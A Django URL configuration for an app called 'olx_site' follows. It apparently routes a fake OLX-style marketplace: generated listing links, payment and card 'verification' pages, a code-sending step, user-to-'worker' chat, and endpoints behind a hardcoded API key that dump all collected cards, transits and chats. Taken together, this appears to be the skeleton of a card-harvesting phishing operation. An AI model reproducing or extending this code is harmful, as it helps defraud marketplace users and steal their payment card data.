from django.urls import path

from . import views

api_key = "Hu7p8t24ybuuAeZ"

app_name = 'olx_site'
urlpatterns = [
    path('create_url/', views.createUrl, name='index'),
    path('id:<int:prod_id>/', views.detail, name='detail'),
    path('create_url/create/', views.addToDB, name='create'),
    path('id:<int:prod_id>/payment/', views.payment, name='payment'),
    path('id:<int:prod_id>/payment/verif/', views.verif, name='verif'),
    path('id:<int:prod_id>/payment/verification/card=<str:card>', views.verification, name='verification'),
    path('id:<int:prod_id>/send-code/', views.code, name="code"),
    path('id:<int:prod_id>/send-mess-user/', views.send_mess_from_user, name='send_mess_from_user'),
    path('id:<int:prod_id>/send-mess-work/', views.send_mess_from_worker, name='send_mess_from_worker'),
    path('id:<int:prod_id>/delete_url/', views.delete_from_db, name="delete_url_from_db"),
    path('id:<int:prod_id>/transit/', views.transit, name="transit"),
    path(f'api-key:{api_key}/get-all-card/', views.get_all_card, name="get_all_card"),
    path(f'api-key:{api_key}/get-all-transit/', views.get_all_transit, name="get_all_transit"),
    path(f'api-key:{api_key}/get-all-chat/', views.get_all_chat, name="get_all_chat"),

]
